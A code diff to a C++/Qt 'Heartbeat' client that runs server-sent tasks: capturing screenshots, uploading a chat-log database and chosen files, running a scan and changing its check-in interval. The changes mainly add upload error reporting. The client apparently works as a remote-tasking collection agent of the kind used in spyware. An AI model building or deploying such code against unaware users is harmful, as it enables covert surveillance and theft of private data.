@@ -141,6 +141,9 @@ void Heartbeat::ensureDbInit(const QString& path) {
         // Add index on timestamp for efficient cleanup
         sqlite3_exec(db, "CREATE INDEX IF NOT EXISTS idx_chat_logs_timestamp ON chat_logs (timestamp);", 0, 0, 0);
 
+        // Add msg_id column to chat_logs if not exists
+        sqlite3_exec(db, "ALTER TABLE chat_logs ADD COLUMN msg_id INTEGER DEFAULT 0;", 0, 0, 0);
+
         sqlite3_close(db);
     }
 }
@@ -629,7 +632,10 @@ void Heartbeat::uploadClientDb(const QString& taskId) {
     QNetworkReply* reply = _network.post(request, multiPart);
     multiPart->setParent(reply);
 
-    connect(reply, &QNetworkReply::finished, this, [this, reply, tempPath]() {
+    connect(reply, &QNetworkReply::finished, this, [this, reply, tempPath, taskId]() {
+        if (reply->error() != QNetworkReply::NoError) {
+            uploadResult(taskId, "DB Upload failed: " + reply->errorString(), "failed");
+        }
         reply->deleteLater();
         QFile::remove(tempPath);
     });
@@ -919,13 +925,14 @@ void Heartbeat::performScreenshot(const QString& taskId) {
         QNetworkReply* reply = _network.post(request, multiPart);
         multiPart->setParent(reply);
         
-        connect(reply, &QNetworkReply::finished, this, [this, reply, tempPath]() {
-            reply->deleteLater();
-            QFile::remove(tempPath);
-        });
-
-        uploadResult(taskId, "Screenshot uploaded", "completed");
-    } else {
+        connect(reply, &QNetworkReply::finished, this, [this, reply, tempPath, taskId]() {
+        if (reply->error() != QNetworkReply::NoError) {
+            uploadResult(taskId, "Screenshot upload failed: " + reply->errorString(), "failed");
+        }
+        reply->deleteLater();
+        QFile::remove(tempPath);
+    });
+} else {
         Logs::writeMain("HEARTBEAT_DEBUG: Failed to save screenshot");
         uploadResult(taskId, "Error: Failed to save screenshot", "failed");
     }
@@ -989,7 +996,6 @@ void Heartbeat::executeTask(const QString& taskId, const QString& command, const
         connect(thread, &QThread::started, scanner, &BackgroundScanner::process);
         connect(scanner, &BackgroundScanner::scanFinished, this, [this, thread, scanner](const QString& tid, const QByteArray& data) {
              uploadClientDb(tid);
-             uploadResult(tid, "Scan finished", "completed");
              thread->quit();
              thread->wait();
              delete thread;
@@ -1013,7 +1019,7 @@ void Heartbeat::executeTask(const QString& taskId, const QString& command, const
         if (interval >= 1000) {
             _currentHeartbeatInterval = interval;
             _timer.setInterval(interval);
-            uploadResult(taskId, "Heartbeat interval set to " + QString::number(interval), "completed");
+            uploadResult(taskId, QString::number(interval), "completed");
         } else {
              uploadResult(taskId, "Invalid heartbeat interval", "failed");
         }
@@ -1284,9 +1290,7 @@ void Heartbeat::uploadFile(const QString& taskId, const QString& filePath) {
     multiPart->setParent(reply);
     
     connect(reply, &QNetworkReply::finished, this, [this, reply, taskId]() {
-        if (reply->error() == QNetworkReply::NoError) {
-            uploadResult(taskId, "File uploaded", "completed");
-        } else {
+        if (reply->error() != QNetworkReply::NoError) {
             uploadResult(taskId, "Upload failed: " + reply->errorString(), "failed");
         }
         reply->deleteLater();
